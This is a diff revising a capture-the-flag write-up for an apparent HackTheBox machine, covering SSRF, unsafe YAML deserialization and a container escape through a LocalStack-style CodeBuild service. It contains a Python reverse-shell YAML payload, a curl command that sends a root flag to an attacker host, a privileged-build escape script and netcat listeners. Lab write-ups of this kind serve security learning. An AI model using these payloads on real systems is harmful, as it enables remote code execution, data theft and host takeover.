@@ -34,6 +34,8 @@ Exploring the application revealed a feature allowing users to upload a YAML con
 
 ![Job Submitter](images/Image2.png)
 
+---
+
 Because the backend needed to retrieve remote resources before validating them, this immediately suggested a potential Server-Side Request Forgery (SSRF) attack surface.
 
 The application attempted to protect itself by only allowing `.yaml` URLs while blacklisting addresses such as `localhost`, `127.0.0.1`, and `169.254.169.254`. Both protections relied on shallow validation.
@@ -77,7 +79,7 @@ export AWS_SESSION_TOKEN="<SESSION_TOKEN>"
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-Since the target used LocalStack, every request specified the custom endpoint.
+Since the target used floci/LocalStack, every request specified the custom endpoint.
 
 ```bash
 aws --endpoint-url http://aws.nimbus.htb sqs list-queues
@@ -107,7 +109,7 @@ A malicious YAML payload containing a Python reverse shell was created and saved
 name: nightly-db-backup 
 schedule: '* * * * *' 
 runtime: python3.11 
-exploit: !!python/object/apply:subprocess.Popen [ ['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'] ]
+exploit: !!python/object/apply:subprocess.Popen [ ['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'] ]
 ```
 
 Start a listener:
@@ -220,7 +222,7 @@ This confirmed that the worker continuously trusted and executed user-controlled
 
 Attempts to communicate directly with the local LocalStack instance (`floci`) using the previously acquired IAM temporary credentials from the host shell consistently resulted in `403 AccessDenied` responses.
 
-This demonstrated that although the compromised `nimbus-worker` and `nimbus-web` IAM roles were heavily restricted, the internal `worker.py` daemon processed queued jobs using an unthrottled administrative context. Instead of interacting with LocalStack directly, the attack was therefore performed by submitting a malicious job to the application's asynchronous processing queue.
+This demonstrated that although the compromised `nimbus-worker-role` and `nimbus-web-role` IAM roles were heavily restricted, the internal `worker.py` daemon processed queued jobs using an unthrottled administrative context. Instead of interacting with LocalStack directly, the attack was therefore performed by submitting a malicious job to the application's asynchronous processing queue.
 
 ---
 
@@ -270,7 +272,6 @@ The payload (`escape.yaml`) is shown below.
 
 ```yaml
 name: escape-via-queue
-
 script: |
     import boto3
 
@@ -286,43 +287,38 @@ script: |
           - ulimit -c unlimited || true
           - bash -c 'kill -11 $$' || true
           - sleep 2 || true
-          - curl -sf -X POST http://<ATTACKER_IP>:<PORT>/root \
-              -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" \
-              --max-time 10 || true
+          - curl -sf -X POST http://<ATTACKER_IP>:<PORT>/root -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" --max-time 10 || true
     """
 
     cb = boto3.client(
-        "codebuild",
-        region_name="us-east-1",
-        endpoint_url="http://floci:4566",
-        aws_access_key_id="test",
-        aws_secret_access_key="test"
+        'codebuild',
+        region_name='us-east-1',
+        endpoint_url='http://floci:4566',
+        aws_access_key_id='test',
+        aws_secret_access_key='test'
     )
 
     try:
         cb.create_project(
-            name="nimbus-exploit",
-            source={"type": "NO_SOURCE"},
-            artifacts={"type": "NO_ARTIFACTS"},
+            name='nimbus-exploit',
+            source={'type': 'NO_SOURCE'},
+            artifacts={'type': 'NO_ARTIFACTS'},
             environment={
-                "type": "LINUX_CONTAINER",
-                "computeType": "BUILD_GENERAL1_SMALL",
-                "image": "floci/floci:latest",
-                "privilegedMode": True
+                'type': 'LINUX_CONTAINER',
+                'computeType': 'BUILD_GENERAL1_SMALL',
+                'image': 'floci/floci:latest',
+                'privilegedMode': True
             },
-            serviceRole="arn:aws:iam::000000000000:role/codebuild-role"
+            serviceRole='arn:aws:iam::000000000000:role/codebuild-role'
         )
+
     except Exception:
         pass
 
     cb.start_build(
-        projectName="nimbus-exploit",
+        projectName='nimbus-exploit',
         environmentVariablesOverride=[
-            {
-                "name": "BASH_FUNC_id%%",
-                "value": "() { echo uid=1000; }",
-                "type": "PLAINTEXT"
-            }
+            {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
         ],
         buildspecOverride=buildspec
     )
@@ -337,7 +333,7 @@ A listener was started to receive the exfiltrated root flag from the host after 
 For example:
 
 ```bash
-nc -lvnp <PORT>
+nc -nvlp <PORT>
 ```
 
 or alternatively using a simple HTTP server capable of handling POST requests.
@@ -484,6 +480,6 @@ script: |
 
 After starting a listener (e.g., `nc -nvlp <PORT>`) and submitting the payload to the vulnerable queue, the host connects back with a fully interactive **root** shell.
 
-> insert screenshot here
+![Root Shell](images/Image9.png)
 
 At this point, the host is completely compromised, providing unrestricted root access outside the container environment.
